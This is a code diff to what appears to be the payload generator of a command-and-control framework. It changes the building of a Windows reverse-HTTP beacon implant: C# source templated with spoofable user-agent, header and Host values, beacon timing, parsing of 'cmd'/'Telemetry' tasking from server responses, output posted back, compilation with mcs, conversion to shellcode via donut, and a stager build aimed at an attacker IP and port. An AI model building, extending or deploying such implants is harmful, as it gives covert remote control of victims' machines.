@@ -5,6 +5,7 @@ import json
 import subprocess
 import shutil
 from pathlib import Path
+from types import SimpleNamespace
 from core.payload_generator.common import payload_utils as payutils
 from core.payload_generator.common.payload_utils import XorEncode
 from core.payload_generator.windows.http.exe import build_make
@@ -43,9 +44,9 @@ def _emit_post_json_expr(mapping: dict | None) -> str:
 	return f"\"{templ}\""
 
 
-def make_raw(ip, port, cfg=None, scheme="http"):
+def make_raw(ip, port, cfg=None, profile=None, scheme="http"):
 	base_url = f"{scheme}://{ip}:{port}"
-	if cfg:
+	if profile:
 		print(cfg)
 		ua = cfg.useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 		get_url  = base_url.rstrip("/") + cfg.get_uri
@@ -54,7 +55,17 @@ def make_raw(ip, port, cfg=None, scheme="http"):
 		post_headers = _emit_header_lines(cfg.headers_post, "postReq", is_post=True)
 		accept_line = f'getReq.Accept = "{_cs_escape(cfg.accept)}";' if cfg.accept else ""
 		host_line   = f'getReq.Host = "{_cs_escape(cfg.host)}";'     if cfg.host else ""
-		range_line  = f'getReq.AddRange(0, {int(cfg.byte_range)});'  if cfg.byte_range else ""
+		range_line  = ""
+		try:
+			if getattr(cfg, "byte_range", None) is not None and str(cfg.byte_range).strip().isdigit():
+				range_line = f'getReq.AddRange(0, {int(cfg.byte_range)});'
+
+			else:
+				range_line = ""
+
+		except Exception:
+			range_line = ""
+		#range_line  = f'getReq.AddRange(0, {int(cfg.byte_range)});'  if cfg.byte_range else ""
 		accept_post = f'postReq.Accept = "{_cs_escape(cfg.accept_post)}";' if cfg.accept_post else ""
 		host_post = f'postReq.Host = "{_cs_escape(cfg.host_post)}";' if cfg.host_post else ""
 		# we keep your two sleeps but drive them from interval if provided
@@ -92,12 +103,15 @@ def make_raw(ip, port, cfg=None, scheme="http"):
 
 	else:
 		# legacy hardcoded defaults
-		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+		ua = cfg.useragent if cfg.useragent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 		get_url = post_url = f"{base_url}/"
-		get_headers = post_headers = ""
-		accept_line = host_line = range_line = ""
+		get_headers = cfg.headers_get if cfg.headers_get else ""
+		post_headers = cfg.headers_post if cfg.headers_post else ""
+		accept_line = cfg.accept if cfg.accept else ""
+		host_line = cfg.host if cfg.host else ""
+		range_line = cfg.byte_range if cfg.byte_range else ""
 		accept_post = ""
-		sleep_short, sleep_long = 2000, 5000
+		sleep_short, sleep_long = cfg.interval_ms, 5000
 		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
 		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'
 
@@ -321,7 +335,36 @@ def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent
 		}
 		cfg = loader_cls().load(prof, defaults=defaults)
 
-	raw = make_raw(ip, port, cfg=cfg, scheme=scheme)
+	else:
+		# No profile → still honor the GUI fields (headers, UA, accept, range, beacon)
+		h = headers or {}
+		cfg = SimpleNamespace(
+			# URIs
+			get_uri="/",
+			post_uri="/",
+			# Headers
+			headers_get=h,
+			headers_post={k: v for k, v in h.items() if k.lower() != "content-length"},
+			# Common header-ish fields
+			useragent=useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+			accept=accept,
+			host=h.get("Host"),
+			byte_range=byte_range,               # handled safely in make_raw (numeric-only AddRange)
+			accept_post=accept,
+			host_post=h.get("Host"),
+			# Timing
+			interval_ms=int(beacon_interval) * 1000 if beacon_interval else 3000,
+			# Mapping defaults so POST body is {"output":"<b64>"} and GET extracts JSON "output"/"cmd"/"Telemetry"
+			get_server_mapping={},
+			post_client_mapping={"output": "{{payload}}"},
+		)
+
+	if profile:
+		raw = make_raw(ip, port, cfg=cfg, scheme=scheme, profile=True)
+
+	else:
+		raw = make_raw(ip, port, cfg=cfg, scheme=scheme, profile=False)
+
 	#print(raw)
 
 	# 2) write to temp .c file
@@ -331,7 +374,7 @@ def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent
 			f.write(raw)
 		
 		# 3) compile with Mingw‑w64 as x86_64 Windows exe
-		exe_path = c_path[:-2] + ".exe"
+		exe_path = c_path[:-3] + ".exe"
 		mcs = "mcs"
 		cmd = [
 			mcs,
@@ -340,7 +383,7 @@ def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent
 			c_path
 		]
 		#print(f"[+] Compiling payload: {' '.join(cmd)}")
-		subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+		subprocess.run(cmd, check=True) #stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
 
 		# 4) run donut to produce shellcode blob (format=raw)
 		sc_path = c_path[:-2] + ".bin"
@@ -389,7 +432,11 @@ def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent
 		#print("RUNNING BUILD")
 		build_status = build_make.build(out, payload, stager_ip, stager_port)
 		if build_status:
-			return True
+			print(brightgreen + f"[+] Successfully built {out}")
+			return str(out)
+
+	except Exception as e:
+		print(f"ERROR: {e}")
 
 	finally:
 		# clean up temp files
